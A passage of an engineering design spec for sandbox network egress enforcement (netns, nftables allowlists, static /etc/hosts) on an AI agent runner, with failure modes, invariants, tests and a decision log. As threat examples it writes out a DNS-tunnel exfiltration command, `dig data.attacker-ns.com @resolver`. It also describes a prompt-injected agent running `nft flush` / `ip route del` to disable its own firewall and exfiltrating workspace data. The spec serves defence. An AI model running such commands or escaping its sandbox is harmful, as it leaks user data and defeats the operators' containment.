Contract: the legitimate path (inference endpoint + declared `allow_hosts`, rules installed) is observably unchanged — the agent's LLM call and allowed tool calls still work; only non-allowed destinations are newly dropped.

---

## Failure Modes

| Mode | Cause | Handling (system response + what the caller observes) |
|------|-------|--------------------------------------------------------|
| Allowlist too tight | inference endpoint/gateway omitted from `allow_hosts` | lease fails **closed at setup** (not mid-run); operator widens the declared list. Caught by `test_inference_host_always_allowed`. |
| Undeclared **named** tool host | the agent dials a host the author forgot to put in `network.allow` (e.g. `api.stripe.com`) | static `/etc/hosts` miss + port 53 dropped → the tool fails **fast at resolution** (not a 30s hang); the hostname rides the tool error into the agent's output (best-effort) and `http_request` returns its structured L7 error. **Not** a lease failure — the run continues. Structured `blocked_egress` chip → follow-up. Caught by `test_denied_named_host_fails_fast_at_resolution`. |
| Allowlist too loose | an exfil-capable host added | by design the operator's call; §4.1 documents that write-capable allowed hosts remain channels — mitigate via least-privilege secrets, not nftables. |
| **Rotating CDN IPs mid-lease** | a provider (github.com, api.anthropic.com) rotates to an IP not in the resolved set during a long lease | the connect to the new IP drops. **Launch mitigation:** the launch set (inference + 8 registries) is small/stable, resolved at setup; for long leases, PLAN decides periodic re-resolve OR a provider CIDR allowance. The complete fix (name-layer) is the deferred §5 proxy. Document the limitation; don't silently widen to a CIDR that re-opens exfil. |
| nft/netns setup fails | kernel/permission error installing rules | child has **no** egress (fail-closed); lease classified a sandbox/egress failure, never falls back to open net. `test_egress_fails_closed_without_rules`. |
| In-child forwarding resolver | an implementer "just allows port 53" to a real/recursive resolver | **reopens DNS-tunnel exfil** (`dig data.attacker-ns.com @resolver` smuggles secrets in query names past the IP-allowlist). Forbidden by §3.3: child resolution is parent-provided / non-forwarding-stub only. Caught by `test_dns_tunnel_query_dropped`. |
| Child disables its own firewall | a prompt-injected agent runs `nft flush` / `ip route del` inside its netns | **no effect** — the rules are root-owned on the host side of the veth (Invariant 6); the child's namespace-local caps don't reach them. Caught by `test_child_cannot_flush_egress_rules`. |
| **IPv6 bypass** | the child reaches a host over IPv6 while nft only filters IPv4 | **forbidden** — the netns has no v6 address/route and nft drops v6 egress (Invariant 8); `Plan` rejecting a v6 allowlist entry is necessary but not sufficient. Caught by `test_no_ipv6_egress`. |
| Stale nft objects | a crashed/half-torn-down lease leaves a table/veth behind | per-lease teardown is idempotent and the table is **per-worker** (`uz_egress<idx>`), so a normal finish drops only that worker's table. Caught by `test_egress_teardown_idempotent`. |
| **Runner SIGKILL/crash + restart** (Indy, Jun 11, 2026) | `systemctl kill`/OOM/crash skips every `defer destroy()` → `uz_egress<idx>` tables, `uzveth<idx>` veths, and (option D) `/run/netns/uz-*` bind-mounts **leak**; on restart, re-creating `uz_egress<idx>` over the leaked one (`NEWTABLE` uses `CREATE` w/o `EXCL`) would accumulate duplicate rules | **Graceful stop** (SIGTERM/drain) is clean — leases finish, `defer destroy()` drops each. **Hard kill is NOT** — and there is **no boot-time reconciliation yet**. **2.0.1 must build a startup sweep**: at boot, flush every `uz_egress*` table + `uzveth*` link + `/run/netns/uz-*` (prefix match) before establishing fresh per-lease egress. Until then a killed runner leaves stale objects until manual cleanup / reboot. *(No production impact today — nothing creates these until `establishEgress` lands.)* |
| Open-net half-state | a logic bug emits `--share-net` AND skips the nft install | **forbidden** — own-filtered-netns XOR host-share, and setup failure is fail-closed (Invariant 7); the child is never in the host netns without nft. Caught by `test_no_open_net_half_state`. |
| Operator runs `deny_all` | no network configured | unchanged — empty netns, no veth; the agent has no egress (correct for non-network agents). |

---

## Invariants

1. **No host-netns sharing** — no sandboxed tier emits `--share-net`; the child's net namespace is always unshared. Enforced by `test_no_share_net_on_any_sandboxed_tier`.
2. **Default-deny egress (nftables)** — a destination IP not in the resolved allowlist is dropped by **host-side nft on the veth** (host netns, root-owned — Invariant 6); the child's only route is the veth, and **no forwarding DNS resolver is reachable** (§3.3) so secrets cannot tunnel in DNS query names. Enforced by `test_denied_ip_dropped` + `test_egress_fails_closed_without_rules` + `test_dns_tunnel_query_dropped`.
3. **No datastore credential in the child** — the runner is built `base,sqlite` (`build_runner.zig`); the child holds no database connection string and opens no datastore socket; durable memory is the control plane's HTTPS responsibility. **Never build the runner with `-Dengines=postgres`.** Enforced by a build-config assertion + the absence of a DB host in the resolved allowlist.
4. **Allowlist is parent-owned** — nothing in the child's environment or lease can widen the resolved nft set. Enforced by `test_allowlist_not_child_extendable`.
5. **Legitimate path unchanged** — inference endpoint + declared `allow_hosts` (rules installed) produce an identical observable outcome; a golden-arg/integration test pins it.
6. **Egress rules are root-owned and child-unreachable** — the netns / veth / nftables config is installed by the **root daemon on the host side of the veth** (or in a netns the child's user namespace does **not** own). The sandboxed child holds only namespace-local capabilities and **cannot `nft flush`, alter routes, or reconfigure the veth** to widen its own egress. Enforced by `test_child_cannot_flush_egress_rules`.
7. **Fail-closed, never a half-open state** — any netns/veth/nft setup failure yields **no egress** (the lease is refused as a sandbox/egress failure); there is **no** fallback to `--share-net` / open net. The build is own-filtered-netns **XOR** host-net-share — it must never leave the child in the host netns *without* nft installed. Enforced by `test_egress_fails_closed_without_rules` + `test_no_open_net_half_state`.
8. **No IPv6 egress path** — the child's netns is provisioned with **no IPv6 address or route**, and nft drops any v6 egress, so the IPv4 allowlist cannot be silently bypassed over v6. `Plan` rejecting a v6 *allowlist entry* is **not** sufficient on its own — the child must be unable to *use* v6 at all. A v6 leak defeats the whole boundary. Enforced by `test_no_ipv6_egress`. *(Surfaced by the Codex adversarial review, Jun 10, 2026.)*

---

## Test Specification (tiered)

> **Lane:** the Linux-only integration tests run on the **`test-integration-runner`** lane created in M84_003 (`zig build --build-file build_runner.zig test-integration`) — they create net namespaces, install nftables rules, and assert kernel-level connect refusal, a privileged-Linux environment. `builtin.os.tag == .linux`-gated (`SkipZigTest` on macOS). macOS dev-loop proof = cross-compile the runner TEST graph for both linux targets.

| Dimension | Tier | Test | Asserts (concrete inputs → expected output) |
|-----------|------|------|---------------------------------------------|
| 1.1 | unit | `test_no_share_net_on_any_sandboxed_tier` | builder output contains no `--share-net`; net namespace unshared on every sandboxed tier |
| 1.2 | integration-runner | `test_egress_fails_closed_without_rules` | nft setup absent → child `connect()` to any host fails; lease classified egress-failure, not open-net |
| 2.1 | integration-runner | `test_allowed_ip_reachable` | allowlist=\{inference IP\}; child reaches it; request succeeds |
| 2.2 | integration-runner | `test_denied_ip_dropped` | child connect to a non-allowed IP → dropped; `egress_denied` logged (IP only) |
| 2.3 | integration-runner | `test_link_local_and_private_denied` | child connect to 127.0.0.1 (host) / 169.254.x / RFC1918 (outside veth subnet) → dropped |
| 3.1 | unit + integration-runner | `test_inference_host_always_allowed` | configured inference endpoint resolved + present in the nft set; unresolvable → fail-closed at setup |
| 3.2 | unit | `test_allowlist_not_child_extendable` | an `allow_hosts`-like value in child env/lease does NOT widen the nft set |
| 3.3 | integration-runner | `test_no_forwarding_resolver_reachable` + `test_dns_tunnel_query_dropped` | child has no port-53 path to a forwarding resolver; a `dig data.x.com @resolver` tunnel attempt is dropped; allowlisted-name resolution still succeeds via the parent-provided path |
| 3.4 | integration-runner | `test_denied_named_host_fails_fast_at_resolution` | an off-allowlist **named** host misses `/etc/hosts` with port 53 dropped → fast resolution failure (no hang); an allowed host resolves via `/etc/hosts` and connects. *(Structured `blocked_egress` capture + its DNS stub → deferred follow-up.)* |
| Inv 6 | integration-runner | `test_child_cannot_flush_egress_rules` | a child runs `nft flush` / `ip route del` with its in-userns caps → the enforced egress set is unchanged (rules are host-side, root-owned) |
| Inv 7 | integration-runner | `test_no_open_net_half_state` | a build that emits `--share-net` AND skips the nft install is rejected; the child is never left in the host netns without nft (own-netns XOR host-share) |
| Inv 8 | integration-runner | `test_no_ipv6_egress` | the child has no IPv6 address/route and a v6 connect attempt is dropped — the v4 allowlist can't be bypassed over v6 |
| oracle | unit (Linux fixtures) | `test_nft_bytes_match_nft_debug_fixtures` | the nft table/chain/set/rule messages we build match fixtures captured from `nft --debug=netlink` — kernel-correct, not just self-consistent (the danger-zone validation Codex required before ship) |
| teardown | integration-runner | `test_egress_teardown_idempotent` | setup deletes pre-existing same-named objects; double-teardown is a no-op; no stale permissive nft objects survive a crashed lease |

- **Regression:** existing runner suite (`make test-unit-zigrunner`) + a legitimate end-to-end lease (inference + an allowed tool host) still pass — the network-enabled agent still works.
- **Idempotency/replay:** N/A.
- **Deferred (§5, untrusted-GA — NOT in this slice):** `test_raw_ip_dns_pin`, `test_unknown_or_encrypted_sni_denied`, name-based `CONNECT` allowlisting.

---

## Acceptance Criteria

- [ ] No sandboxed tier emits `--share-net`; child net namespace unshared — verify: `test_no_share_net_on_any_sandboxed_tier`
- [ ] Allowed inference IP reachable; non-allowed IP dropped — verify: `test_allowed_ip_reachable` + `test_denied_ip_dropped`
- [ ] Link-local / loopback-to-host / private-range dropped — verify: `test_link_local_and_private_denied`
- [ ] nft/netns setup failure fails closed (no open-net fallback); no `--share-net`+skipped-nft half-state — verify: `test_egress_fails_closed_without_rules` + `test_no_open_net_half_state`
- [ ] Egress rules root-owned (host side of the veth); a sandboxed child cannot `nft flush` / reconfigure its own firewall — verify: `test_child_cannot_flush_egress_rules`
- [ ] Inference endpoint always resolved into the nft set; allowlist not child-extendable — verify: `test_inference_host_always_allowed` + `test_allowlist_not_child_extendable`
- [ ] No forwarding DNS resolver reachable from the child; DNS-tunnel attempt dropped (parent-provided resolution) — verify: `test_no_forwarding_resolver_reachable` + `test_dns_tunnel_query_dropped`
- [ ] A denied **named** egress fails **fast at resolution** (no 30s hang) with the hostname in the agent's tool error; structured `blocked_egress` chip deferred to follow-up — verify: `test_denied_named_host_fails_fast_at_resolution`
- [ ] Child holds no datastore credential; runner not built with postgres engine — verify: `grep -n 'engines' build_runner.zig` shows `base,sqlite`; no DB host in the resolved allowlist
- [ ] `make lint` clean · `make test-unit-zigrunner` + `make test-integration-runner` pass · cross-compile both linux targets
- [ ] `gitleaks detect` clean · no file over 350 lines added
- [ ] `runner_fleet.md` documents the launch egress model + notes the §5 L7 proxy as the untrusted-GA follow-up
- [ ] (L7 DNS-pinning proxy, raw-IP/SNI/DoH resistance → §5, deferred to untrusted-runner GA)

---

## Eval Commands (post-implementation)

```bash
# E1: no --share-net anywhere in the network builder
git grep -n 'share-net' src/runner && echo "FAIL: share-net still present" || echo "PASS"
# E2: runner unit + app suites (legitimate path unchanged)
make test-unit-zigrunner 2>&1 | tail -5 && make test 2>&1 | tail -5
# E3: egress integration lane (allowed/denied IP, link-local, no-rules fail-closed)
make test-integration-runner 2>&1 | tail -10
# E4: dev-loop proof — Linux-only bodies compile
zig build --build-file build_runner.zig test-integration -Dtarget=x86_64-linux 2>&1 | tail -3
# E5: runner is base,sqlite (no DB credential in the child)
grep -n 'engines' build_runner.zig
# E6: gitleaks
gitleaks detect 2>&1 | tail -3
```

---

## Dead Code Sweep

**1. Orphaned files — none expected.**

| File to delete | Verify |
|----------------|--------|
| N/A — refactor of the network path, no file removed | — |

**2. Orphaned references.** The log-only `log.debug("allowlist_host", …)` emit and the `--share-net` literal are removed when enforcement lands; grep must show zero remaining `share-net` in `src/runner` (E1).

---

## Discovery (consult log)

- **Origin (Jun 05, 2026):** Orly CTO adverse review of M84_003. Pinned residual: `registry_allowlist` emits `--share-net` (`network.zig:68-76`) = full host egress; allowlist log-only (`runner_network_policy.zig`). M84_003 §5.1 characterized this gap; this workstream closes it.
- **Threat re-scoping with Indy (Jun 05, 2026):** the deployment is **baremetal, not a VM** → no cloud metadata service. **No co-located Postgres/Redis** and **no inbound listener** on the runner box (`control_plane_client.zig` is outbound `std.http.Client.fetch`; no `listen`/`bind`). So lateral movement and loopback-to-datastore are moot; the surviving threat is **outbound secret exfiltration**.
  - **Memory path confirmed:** the runner is built `.engines = "base,sqlite"` (`build_runner.zig`); the untrusted child never holds a DB DSN → Invariant 3.
- **Adversarial review + launch pull-forward (Jun 10, 2026, three-agent code-grounded):** the original whole-spec deferral was refuted. Findings (file:line):
  - `--share-net` on the **production** `registry_allowlist` tier (baremetal sets it; `sandbox_args.zig:126` `--unshare-all` then `network.zig:73` `--share-net`); allowlist log-only (`runner_network_policy.zig`). The code default `deny_all` has no network.
  - in-engine policy wraps only `http_request` (`tool_bridge.zig:39`); `bash`/`git`/`web_fetch` carry none (`tool_builders.zig`).
  - the lease carries the raw secret inline (`protocol_test.zig:239`); `secrets_resolve.zig:48` reads vault creds verbatim; `docs/AUTH.md:204` "static, long-lived, never expires" → the "short-lived/least-privilege tool secrets" compensating control is **unbuilt**.
  - **Verdict:** PULL-SLICE — ship the kernel default-deny half (own-netns + nftables IP-allowlist) for launch; defer the L7 proxy (§5) to untrusted-GA. Honest caveat: github.com-via-github exfil stays open until scoped tokens land (§4.1).
  - **Indy decision (verbatim, Jun 10, 2026):** _"I want to go with 1"_ — option 1 (nftables egress slice). Context: chosen over (2) build short-lived tokens, (3) interim deny_all for token-bearing leases, (4) accept+document.
- **Greptile review (PR #384, Jun 10, 2026):** flagged a **DNS-tunnel exfil residual** — the draft Interfaces contract left `(∪ DNS resolver, if in-child resolution)` open, which a forwarding resolver turns into a `dig data.attacker.com @resolver` channel the IP-allowlist cannot see (connect target is the *allowed* resolver IP). **Resolved by closing it, not accepting it:** §3.3 mandates parent-provided resolution / a non-forwarding stub; Interfaces, Failure Modes, Invariant 2, §4, Test Spec + Acceptance updated. Verdict: P2, VALID & ACTIONABLE.
- **Source correction (Indy, Jun 10, 2026):** the original draft invented an "operator-declared `allow_hosts` parse in `daemon/config.zig`" — wrong. The per-zombie allowlist **already exists and is carried**: TRIGGER.md `x-usezombie.network.allow` (the schema's *"kernel-level egress rule, rejected at packet time"*) → `execution_policy.NetworkPolicy` → merged with `REGISTRY_ALLOWLIST` per M2_001/M3_001. `runner_network_policy.zig`'s own header names the remaining gap as *"Phase 2 (nftables)"*. So this workstream is **purely the Phase-2 enforcement** of an existing, merged, lease-carried allowlist — no new sourcing. **Indy go (verbatim):** _"Build it (slim M84_004)"_ — token-bearing agents are in the launch set, so the hole must close; re-source to `NetworkPolicy` and ship the nftables enforcement.
- **Author-facing denial decision (Indy, Jun 10, 2026):** in PLAN, surfaced that `egress_denied` as originally specced was an operator-only **log line** (journald) — the end user (zombie author) would get only a silent connect timeout and never learn *which* host to declare. Indy: _"would it not make sense to inform the user?"_ → **yes.** Added **Dimension 3.4**: the parent-provided stub resolver answers an off-list name with `NXDOMAIN` (fast fail, no 30s hang, no wasted lease wall-clock) and **records** the denied name; the **parent** (tamper-proof against the child, Invariant 6) folds it into `ExecutionResult.blocked_egress`, which rides the existing `report` path (`ExecutionResult` → `ReportRequest` → `core.zombie_events`) to the author's run-detail surface. This biases the §3.3 resolution mechanism to the **stub** option (only a resolver process can record an off-list query). **→ Superseded below (Jun 10): simplified to static `/etc/hosts`; the structured `blocked_egress` field + DNS stub deferred to a follow-up.**
- **PARK decision (Indy, Jun 11, 2026) — enforcement deferred to 2.0.1:** after option D was validated, Indy chose to ship neither D nor a fail-closed interim now: _"we can skip D i think, if so we just allow all traffic? lets do that until 2.0.0"_ → _"i dont want to implement the D you mention, what will be impact?"_ → _"do the ack-quote, park the spec, but push this branch as PR, so this can be used in 2.0.1 when we are testing this can can even be fixed."_ **Impact accepted:** `main` already does allow-all (`registry_allowlist` keeps `--share-net`; the branch's `--share-net` drop is unmerged), so the P1 exfil hole stays open until 2.0.1; bounded by the network-enabled tier only (`deny_all` default = no network). The branch (pure layer + datapath proof + validated option-D recipe, ~80% done) is pushed as a **draft PR** for 2.0.1 continuation — finish = the `establishEgress` option-D wiring (recipe below), not research. Exposure question (real vs theoretical pre-2.0.1 tenant data) left unanswered → carried as a known risk.
- **Egress policy abstraction (Indy, Jun 11, 2026) — refines the PARK into a switch:** rather than ship a throwaway allow-all revert, Indy asked for the two paths as a selectable abstraction: _"its abstraction for me... keep the strict implement (not fully done invoked) when i turn on the option. In other cases i call another method or policy."_ Implemented as `Policy.Mode` (3 postures) selected by `RUNNER_NETWORK_POLICY`: `registry_allowlist` = interim allow-all (`--share-net`, runtime-identical to today), `registry_allowlist_strict` = the opt-in option-D kernel-enforced path that **fails closed (`UZ-RUN-007`)** until `establishEgress` lands (2.0.1) — never silently pretends to enforce. `Policy.sharesHostNet()`/`enforcesEgress()` are the strategy helpers; `sandbox_args` re-shares host net iff `sharesHostNet()`; `child_supervisor` refuses strict leases fail-closed. So merging is runtime-safe (allow-all preserved) and 2.0.1 flips the switch with no code churn. Config stays **env-only** — Indy: _"as long as we have it covered now i am fine with env, no other punchlist needed for this yaml or json."_
- **Honest mode names + open default (Indy, Jun 11, 2026):** Indy flagged that `registry_allowlist` was a misnomer (it allowed *everything* in the interim, not an allowlist) and asked for honest names + `allow_all` as the default. Renamed: `allow_all` (DEFAULT/unset, `--share-net` full egress) · `deny_all` (no net) · `registry_allowlist` (the *enforced* allowlist — name now true; opt-in, fail-closed until 2.0.1). This flips the runner to **open-by-default** (previously secure-by-default `deny_all`) — a deliberate interim posture; the default must return to the enforced mode when option D lands.
- **Final mode names (Indy, Jun 11, 2026):** Indy supplied an operator-legibility naming set (avoid `strict`/`secure`/`mode` words that decay). **Final names:** `allow_all` (DEFAULT, everything outbound) · `deny_all_egress` (no outbound traffic) · `allow_list_egress` (outbound only to permitted destinations — the enforced, opt-in option-D path; fail-closed `UZ-RUN-007` until 2.0.1). Supersedes the earlier `deny_all` / `registry_allowlist`-as-enforced naming in this Discovery trail. The stale `RUNNER_NETWORK_POLICY=registry_allowlist` value is now unrecognized → falls back to the `allow_all` default (stale prod env keeps egress, not fail-closed) — so **no forced deploy migration**; the deploy unit comment + playbooks still want a clarity update to the new names (deploy-config = approval-gated).
- **Option D chosen + validated end-to-end (container, Jun 11, 2026) — supersedes the custom-fork (B):** Indy asked "what does custom fork get me, what's the downside?" The answer surfaced a better path. **Custom fork** (B) is the *only* way to pass bwrap's `--info-fd`/`--block-fd` (std 0.16 `spawn` can't pass extra fds), but it costs an **async-signal-safe `fork`→`exec` window** in a multi-threaded process AND a hand-rolled re-implementation of the exact boundary M84_003 hardened (the `ZOMBIE_` env filter, fd hygiene, single-reaper) — a security regression surface in the worst place. **Option D avoids all of it:** pre-create a **named** netns (`/run/netns/uz-N`), configure the veth + nft on it (no pid needed), then launch via plain `std.process.spawn` (hardened boundary INTACT) a thin `__netns_launch` runner sub-mode that does `setns(/run/netns/uz-N)` then `execve(bwrap --unshare-all --share-net -- runner __execute)`. Validated with real bwrap 0.8 + iproute2: `nsenter(uz-N) → bwrap --unshare-all --share-net` keeps the payload in **the named netns** (`PAYLOAD_NETNS == uz-N`, NOT host), unshares a **fresh user/pid/ipc/uts/cgroup/mnt** ns (full isolation retained — `--unshare-all --share-net` is the documented "unshare all except net" combo, self-maintaining, no flag-drift), and the payload sees the configured veth (`uzveth0p 10.69.0.2/30 UP`). The `setns` runs **post-`exec`, single-threaded** → no async-signal-safe hazard. Cost vs B: named-netns lifecycle (`/run/netns/` create + cleanup) + one `__netns_launch` sub-mode — both smaller and safer than B's. **Production wiring builds against D.** (B's proof retained below as the rejected alternative.)
  - **Binary-free named-netns lifecycle validated (Jun 11, 2026):** the runner must not shell to `ip` — and netns creation isn't netlink, it's syscalls. Confirmed in-container the full recipe with no iproute2 dependency at runtime: **create** = a throwaway child does `unshare(CLONE_NEWNET)` then `mount(MS_BIND, "/proc/self/ns/net" → "/run/netns/uz-N")`; the bind-mount keeps the netns alive after the child exits, parent stays in the host netns (`unshare --net=PATH` performs exactly this and was used to prove it). **Move the veth peer** in via rtnetlink `IFLA_NET_NS_FD` = the open fd of `/run/netns/uz-N` (a new builder beside the existing `IFLA_NET_NS_PID` `moveLinkToNetns`). **Teardown** = `umount("/run/netns/uz-N")` + `unlink` → the netns is reclaimed (validated: path gone, no leak). So `EgressScope` for D: `create` makes the named netns + veth-by-fd + nft + rendered files; `destroy` umounts/unlinks + tears down veth/nft; `attachChild(pid)` is gone.
- **bwrap↔netns choreography proven end-to-end (container, Jun 10, 2026) — REJECTED in favour of D, retained for the record:** `std.process.spawn` (Zig 0.16) cannot pass extra fds, so the egress lease path needs a custom `fork()`+`exec`. Validated the choreography with real bwrap 0.8/0.11 + iproute2 in a privileged container before writing production code: `bwrap --unshare-all --info-fd <w> --block-fd <r>` → bwrap unshares net (distinct netns inode), writes JSON `{"child-pid": N, …}` to the info fd where **N is the host-visible pid** (`/proc/N/ns/net` matches the sandbox netns), then BLOCKS reading the block fd; the parent reads N, moves the veth peer into `/proc/N/ns/net` + configures it, then closes/writes the block fd → bwrap execs the payload with the filtered veth already UP (confirmed the payload sees `uztest0p` UP in its netns). **Decision (post-adversarial-review): option B** — keep `--unshare-all` (self-maintaining isolation; option A's individual-`--unshare-*`-minus-net list can silently drift weaker) and accept the info-fd JSON parse + fd-passing, which fail **loud + closed**. Gotchas banked for the build: open the block fifo read-write (`4<>`) or the launcher deadlocks opening it; per-netns interface checks read `/proc/net/dev` (namespace-aware) NOT `/sys/class/net` (shows the original netns until sysfs remount). Datapath itself (create ACKs full ruleset, veth lifecycle, attachChild crosses the namespace boundary) proven by `network/egress_integration_test.zig` on the Linux lane.
- **Simplification to static `/etc/hosts` + inference-host hoist (Indy, Jun 10, 2026):** Indy challenged the DNS-stub complexity (_"I dont wanna complicate things... if [we] dont implement this what do we lose?"_). Re-derived: the stub's *only* marginal value over a static `/etc/hosts` (+ nft dropping all port 53) is **structured** capture of a denied name; security (arbitrary-host **and** DNS-tunnel exfil) plus fast-fail are fully delivered by the simpler static-hosts path — which is also *less* of a tunnel footgun (no resolver to misconfigure). **Decision: static `/etc/hosts` for launch; structured `blocked_egress` + the DNS stub deferred to a fast follow-up** (best-effort fast-fail surfacing covers the silent-timeout concern in the interim). Separately, Indy asked whether the allowlist/API run _"on the LLM end."_ Confirmed **no** — `network.allow` is parsed at the control plane (`yaml_frontmatter.zig:264`), shipped on the lease (`LeasePayload.policy`), and enforced by the **parent** (nft + `/etc/hosts`, root-owned, Invariant 6) before the child runs; the agent's copy is advisory. The one egress-config still derived child-side — the **inference endpoint URL** (built from `provider` at the NullClaw layer) — is **hoisted to the control plane onto the lease** so the parent allowlists exactly what the engine dials (Dim 3.1, no drift).
- **Threat-model correction against code (Indy, Jun 10, 2026):** Indy challenged the secret-exfil framing (_"how does the attacker actually get the PAT/key?"_). Verified in code: secret **values** are materialized only inside `http_request` (`secret_substitution.zig`, post-sandbox boundary), L7-allowlist-checked, and redacted from frames; `git` has no creds wired (`buildGit`), and no other tool substitutes — so the agent cannot read or route a secret value through `bash`/`web_fetch`. The real day-1 hole is different: `web_fetch` is `allowed_domains = &.{}` (NullClaw empty = **allow-all**, `web_fetch.zig:24`/`:66`) and `bash` is `policy = null` (`buildShell`), so they bypass the per-zombie allowlist that **only** `http_request` honors — exfiltrating the agent's **workspace data** (private repo, fetched files, issue/PR text) and weaponizing the box to any host. The egress slice's precise job: make the allowlist apply to **every** tool at L4/kernel, closing the unpoliced-tool holes; it is defense-in-depth for the (already-protected) secret values, and does **not** close the allowed-write-host residual (§4.1, scoped tokens). Spec Priority / LAUNCH-SLICE / Problem / Prioritization tightened to this code-grounded model.
- **Module redesign + configurable registry (Indy, Jun 10, 2026):** Indy directed (a) a dedicated **`src/runner/network/` directory** of **file-as-struct (`@This()`) modules** in the std idiom (facade like `std.net`; lifecycle `EgressScope` mirroring `engine/cgroup.zig`'s `CgroupScope`; pure netlink serializers golden-byte-tested; `Socket` as the only Linux-gated kernel-touch — addresses via `std.Io.net.IpAddress`), and (b) the registry baseline **fed from outside, not a compile-time constant**: `Allowlist.build` takes `registry` as a parameter, sourced from a new `RUNNER_REGISTRY_ALLOWLIST` env var parsed at daemon config load (comma-separated), with a named default as fallback only. `engine/network.zig` + `engine/runner_network_policy.zig` fold into the new dir (RULE NLR/NLG — move, don't shim), removing the dead `mergeAllowlists`. Files-Changed updated to this layout.
- **Codex adversarial review (Jun 10, 2026):** ran a second-model (OpenAI Codex 0.138.0, high reasoning) adversarial review of the design + the `network/` modules. **Verdict: keep the hand-rolled netlink approach.** `rtnetlink` is a small, defensible surface; **eBPF** (connect4/sendmsg) is *not* better for launch (verifier/kernel-feature drift, cap + pinned-program lifecycle, doesn't cover forwarding/masquerade/veth routing) — a later optimization, not the launch boundary; a C netlink library (`libnftnl`) kills the hermetic build; shelling to `ip`/`nft` is a bad production dependency (but is mandatory as a **test oracle**). **Linux-only is acceptable for the baremetal-Linux launch** (macOS = `pf`/Network Extension, Windows = Windows Filtering Platform — separate backends/privilege models); _"do not sell this as portable."_ The _"basically what Docker does"_ framing is "directionally useful and technically misleading" — Docker delegates to mature runtime code; we hand-encode the sharp part. **Actionable findings folded in:** (1) **IPv6 bypass → Invariant 8** (`Plan` rejecting a v6 entry doesn't stop the child *using* v6; the netns must have no v6 path or the v4 allowlist is silently defeated); (2) **nft rule bytes must be validated against real `nft --debug=netlink` output** — self-invented golden bytes can't catch a wrong nft register/key-type (Test Spec `oracle` row); (3) DNS drop covers UDP **and** TCP :53; integration proves **behaviour** (kernel drop), not just byte stability; (4) the actual allow/drop rule (`nfnetlink_rule.zig`) is the danger zone, **sequenced behind the `nft`-output oracle** — not built blind. Also: stop leaning on "small/stable host set" — registries/inference rotate; **pick breakage over widening** to a CIDR (Failure Modes).
- **Deferrals** — the L7 DNS-pinning proxy (§5) is deferred to untrusted-runner GA per the Jun 10 decision above (Indy-acked option 1, which is "pull the nft slice, defer the proxy"). Any *further* deferral needs a fresh Indy-acked quote here.
- **Skill chain outcomes** — {`/write-unit-test`, `/review`, `/review-pr` results.}

## Skill-Driven Review Chain (mandatory)

| When | Skill | What it does | Required output |
|------|-------|--------------|-----------------|
| After implementation, before CHORE(close) | `/write-unit-test` | Audits negative/regression coverage vs this Test Specification. | Clean. Iteration count + coverage in Discovery. |
| After tests pass, before CHORE(close) | `/review` | Adversarial diff review vs Invariants, Failure Modes, `dispatch/write_zig.md`, `docs/architecture/runner_fleet.md`. | Clean OR every finding dispositioned. |
| After `gh pr create` | `/review-pr` | Review-comments the open PR against the immutable diff. | Comments addressed before human review/merge. |

## Verification Evidence

| Check | Command | Result | Pass? |
|-------|---------|--------|-------|
| Runner unit | `make test-unit-zigrunner` | {paste snippet} | |
| App suite (regression) | `make test` | {paste snippet} | |
| Egress integration | `make test-integration-runner` | {paste snippet} | |
| Lint | `make lint` | {paste snippet} | |
| Cross-compile (TEST graph) | `zig build --build-file build_runner.zig test-integration -Dtarget=x86_64-linux && -Dtarget=aarch64-linux` | {paste snippet} | |
| Gitleaks | `gitleaks detect` | {paste snippet} | |

---

## Out of Scope

- **The L7 DNS-pinning forward proxy** — §5, deferred to untrusted-runner GA (name-based SNI/`CONNECT` allowlisting, DNS-rebinding pin, encrypted-SNI/DoH default-deny). The launch slice is the IP-layer foundation it builds on.
- **M84_003's process-boundary hardening** (env/fd/cap/kill) — that is the sibling spec (DONE, #370); this one owns only network egress.
- **Inbound network policy** — the runner box has no listener; nothing to filter inbound.
- **Cloud metadata / IMDS blocking** — not applicable to the baremetal deployment; the link-local deny (Dim 2.3) covers it for free if a node ever runs in a VM.
- **Rotating / scoping tenant secrets** so a leak is lower-impact — the real mitigation for the §4.1 allowed-host exfil channel, but a credential-model change, not a runner network patch. Names the follow-up (this is option 2 from the Jun 10 decision; option 1 was chosen for launch, option 2 remains the complete-seal follow-up).
